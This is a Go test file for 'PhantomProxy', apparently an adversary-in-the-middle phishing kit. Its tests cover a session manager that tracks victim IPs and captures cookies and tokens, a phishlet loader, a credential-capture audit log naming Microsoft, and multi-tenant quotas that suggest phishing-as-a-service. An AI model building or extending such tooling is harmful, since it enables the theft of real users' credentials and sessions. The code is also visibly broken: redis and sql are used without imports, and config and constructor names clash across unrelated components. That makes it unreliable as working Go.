# PhantomProxy v14.0 - Core Tests
package proxy

import (
	"context"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"go.uber.org/zap"
)

func TestNewAiTMProxy(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	cfg := &Config{
		BindAddr:    "127.0.0.1",
		HTTPSPort:   8443,
		Domain:      "test.local",
		CertPath:    "../../certs/cert.pem",
		KeyPath:     "../../certs/key.pem",
	}

	proxy, err := NewAiTMProxy(cfg, logger)
	assert.NoError(t, err)
	assert.NotNil(t, proxy)
}

func TestSessionManager(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	redisClient := createTestRedisClient()

	mgr := NewSessionManager(redisClient, logger, time.Hour)
	assert.NotNil(t, mgr)

	ctx := context.Background()

	// Create session
	sessionID, err := mgr.Create(ctx, "192.168.1.1", "test.local")
	assert.NoError(t, err)
	assert.NotEmpty(t, sessionID)

	// Get session
	session, err := mgr.Get(ctx, sessionID)
	assert.NoError(t, err)
	assert.Equal(t, "192.168.1.1", session.VictimIP)

	// Add cookie
	err = mgr.AddCookie(ctx, sessionID, "test_cookie", "test_value")
	assert.NoError(t, err)

	// Capture token
	err = mgr.CaptureToken(ctx, sessionID, "csrf_token", "abc123")
	assert.NoError(t, err)

	// Delete session
	err = mgr.Delete(ctx, sessionID)
	assert.NoError(t, err)
}

func TestPhishletManager(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	mgr := NewPhishletManager("../../configs/phishlets", logger)

	// Load phishlets
	err := mgr.LoadAll()
	assert.NoError(t, err)

	// Check count
	count := mgr.Count()
	assert.Greater(t, count, 0)

	// List phishlets
	list := mgr.List()
	assert.NotEmpty(t, list)

	// Get stats
	stats := mgr.ExportJSON()
	assert.NotNil(t, stats)
}

func TestEventBus(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	redisClient := createTestRedisClient()

	eb := NewEventBus(redisClient, logger, "test_channel")
	assert.NotNil(t, eb)

	// Subscribe
	received := make(chan string, 10)
	eb.Subscribe("test.event", func(eventType string, payload map[string]interface{}) {
		received <- eventType
	})

	// Publish
	eb.Publish("test.event", map[string]interface{}{"key": "value"})

	// Wait for event
	select {
	case eventType := <-received:
		assert.Equal(t, "test.event", eventType)
	case <-time.After(time.Second):
		t.Fatal("Timeout waiting for event")
	}

	// Get stats
	stats := eb.GetStats()
	assert.NotNil(t, stats)

	// Close
	err := eb.Close()
	assert.NoError(t, err)
}

func TestRiskCalculator(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	calc := NewCalculator(logger, DefaultConfig())
	assert.NotNil(t, calc)

	ctx := context.Background()

	// Process events
	event := BehaviorEvent{
		UserID:    "user_123",
		EventType: "click",
		EventData: map[string]interface{}{"x": 100, "y": 200},
		Timestamp: time.Now(),
	}

	err := calc.ProcessEvent(ctx, event)
	assert.NoError(t, err)

	// Get risk score
	score := calc.GetRiskScore("user_123")
	assert.NotNil(t, score)
	assert.GreaterOrEqual(t, score.OverallScore, 0.0)
	assert.LessOrEqual(t, score.OverallScore, 100.0)

	// Get distribution
	dist := calc.GetRiskDistribution()
	assert.NotNil(t, dist)

	// Get high risk users
	highRisk := calc.GetHighRiskUsers()
	assert.NotNil(t, highRisk)
}

func TestTenantManager(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	db := createTestDB(t)
	defer db.Close()

	mgr := NewManager(db, logger)

	ctx := context.Background()

	// Init schema
	err := mgr.Init(ctx)
	assert.NoError(t, err)

	// Create tenant
	tenant, err := mgr.CreateTenant(ctx, "Test Corp", "test-corp", "pro")
	assert.NoError(t, err)
	assert.NotNil(t, tenant)
	assert.Equal(t, "Test Corp", tenant.Name)

	// Get tenant
	retrieved, err := mgr.GetTenantBySlug(ctx, "test-corp")
	assert.NoError(t, err)
	assert.Equal(t, tenant.ID, retrieved.ID)

	// Create user
	user, err := mgr.CreateUser(ctx, tenant.ID, "admin@test.com", "password123", "admin")
	assert.NoError(t, err)
	assert.NotNil(t, user)

	// Get user
	retrievedUser, err := mgr.GetUserByEmail(ctx, "admin@test.com")
	assert.NoError(t, err)
	assert.Equal(t, user.ID, retrievedUser.ID)

	// Check quota
	ok, err := mgr.CheckQuota(ctx, tenant.ID, "sessions")
	assert.NoError(t, err)
	assert.True(t, ok)

	// Get stats
	stats, err := mgr.GetTenantStats(ctx, tenant.ID)
	assert.NoError(t, err)
	assert.NotNil(t, stats)
}

func TestGOSTCipher(t *testing.T) {
	cipher, err := NewGOSTCipher(nil)
	assert.NoError(t, err)
	assert.NotNil(t, cipher)

	// Test encrypt/decrypt
	plaintext := []byte("Hello, World!")
	ciphertext, err := cipher.Encrypt(plaintext)
	assert.NoError(t, err)
	assert.NotEqual(t, plaintext, ciphertext)

	decrypted, err := cipher.Decrypt(ciphertext)
	assert.NoError(t, err)
	assert.Equal(t, plaintext, decrypted)

	// Test base64
	encoded, err := cipher.EncryptToBase64(plaintext)
	assert.NoError(t, err)
	assert.NotEmpty(t, encoded)

	decoded, err := cipher.DecryptFromBase64(encoded)
	assert.NoError(t, err)
	assert.Equal(t, plaintext, decoded)
}

func TestAuditLogger(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	config := DefaultConfig()
	config.Enabled = true

	audit, err := NewAuditLogger(logger, config)
	assert.NoError(t, err)
	assert.NotNil(t, audit)

	// Log events
	err = audit.LoginSuccess("user_123", "tenant_456", "sess_789", "192.168.1.1")
	assert.NoError(t, err)

	err = audit.CredentialCapture("sess_789", "tenant_456", "microsoft")
	assert.NoError(t, err)

	err = audit.DataAccess("user_123", "tenant_456", "credentials", "read")
	assert.NoError(t, err)

	// Get stats
	stats := audit.GetStats()
	assert.NotNil(t, stats)
	assert.Equal(t, 3, stats["total_entries"])

	// Export
	exported, err := audit.Export()
	assert.NoError(t, err)
	assert.NotNil(t, exported)

	// Generate compliance report
	report := audit.GenerateComplianceReport("УЗ-2")
	assert.NotNil(t, report)
	assert.Equal(t, "УЗ-2", report.FSTECCategory)

	// Validate compliance
	validation := audit.ValidateCompliance("УЗ-2")
	assert.NotNil(t, validation)
	assert.True(t, validation["compliant"].(bool))
}

// Helper functions
func createTestRedisClient() *redis.Client {
	return redis.NewClient(&redis.Options{
		Addr: "localhost:6379",
	})
}

func createTestDB(t *testing.T) *sql.DB {
	db, err := sql.Open("sqlite3", ":memory:")
	if err != nil {
		t.Fatal(err)
	}
	return db
}
